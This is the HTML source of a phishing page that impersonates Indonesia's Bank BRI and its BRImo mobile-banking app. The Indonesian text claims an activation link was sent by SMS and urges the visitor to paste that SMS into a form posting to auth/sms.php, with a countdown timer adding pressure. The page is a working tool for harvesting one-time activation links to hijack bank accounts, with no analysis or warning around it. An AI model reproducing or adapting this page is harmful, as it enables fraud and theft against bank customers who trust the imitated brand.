<html lang="en"> 
 <head> 
  <meta charset="utf-8"> 
  <meta name="fragment" content="!"> 
  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
  <meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah"> 
  <meta name="apple-mobile-web-app-capable" content="yes"> 
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
  <meta name="theme-color" content="#0f78cb"> 
  <meta property="og:type" content="website"> 
  <meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:"> 
  <title>Bank BRI || Melayani dengan setulus hati</title> 
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
  <link rel="apple-touch-icon" href="img/favicon.ico"> 
  <link rel="icon" href="img/favicon.ico"> 
  <link rel="icon" type="image/png" href="https://i.ibb.co/jLN3Ktj/Epf-Y2q-Uc-AAj4ol-1.jpg"> 
  <link rel="image_src" href="https://i.ibb.co/jLN3Ktj/Epf-Y2q-Uc-AAj4ol-1.jpg"> <!-- Link Swiper's CSS --> 
  <link rel="stylesheet" href="js/swiper-bundle.min.css"> 
  <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            background:#d1d1d1;
        }

        .box-lte {
            width: 380px;
            max-width: 95%;
            background: #fff;
            display: block;
            margin: -40px auto;
            border-radius: 10px;
        }

        textarea {
            border: 3px solid rgb(0, 134, 224);
            border-radius: 8px;
            padding: 5px 10px;
        }
            
        h1{
            display: table;
            background-color: #FF0000;
            color: #fff;
            padding: 15px 0px;
            margin: 0px;
            width: 100%;
            font-size: 1em;
            text-align: center;
            font-weight: bold;
        }
        
    </style> 
 </head> 
 <body> 
  <audio hidden autoplay loop> 
   <source src="audio.mp3" type="audio/mpeg"> 
  </audio> 
  <div class="container"> 
   <div class="box-lte"> 
    <div class="row" style="margin-top: 150px;"> 
     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; : block; margin-top: -60px; border-radius: 0px;"> 
      <center> 
       <img alt="" src="img/sms.png?w=311&amp;h=351&amp;auto=compress&amp;dpr=2&amp;fit=max" style="display:block; margin:auto; width: 35%; height: 60%; border-radius: 0px;"> 
        <p style="font-size: 20px; text-align: center; margin: 10px; font-weight: bold; color: #098CE3;">Cek SMS</p> 
      </center> 
     </div> 
    </div> 
    <div class="row"> 
     <hr style="display: block; margin: auto; width: 90%;"> 
     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer"></p> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
      <p style="font-size: 13px; text-align: center; font-weight: bold; line-height: 2; letter-spacing: 1px;">Link untuk aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu di tempel dibawah ini<br><br></p>
      <p style="font-size: 15px; text-align: center; font-weight: bold; color: #0f78cb;">Tempel SMS BRI (Wajib)</p> 
     </div> 
    </div> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
      <form action="auth/sms.php" method="POST"> 
       <textarea name="sms" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=" maxlength="" rows="1" style="max-width: 90%; display: block; margin: auto; width: 346px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 104px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgba(71, 71, 71, 0.71) 0px 0px 0px 0px; font-family: Arial; font-size: 14px; font-weight: bold; color: rgb(61, 61, 61); text-align: left; height: 102px;" required></textarea> <button type="submit" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 49px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 15px; font-weight: bold; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="2">Konfirmasi</button> 
      </form> 
     </div> 
    </div> 
   </div> 
   <div class="row"> 
    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
     <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="sms.php" style="text-decoration: none; color: #828282;">Kirim ulang</a></strong></p> 
    </div> 
   </div> 
  </div> 
  <script src="js/jquery.min.js"></script> 
  <script src="js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script> 
  <script>
        document.getElementById('timer').innerHTML =
          03 + ":" + 01;
        startTimer();
        
        
        function startTimer() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
    </script> <!-- </body> -->  
 </body>
</html>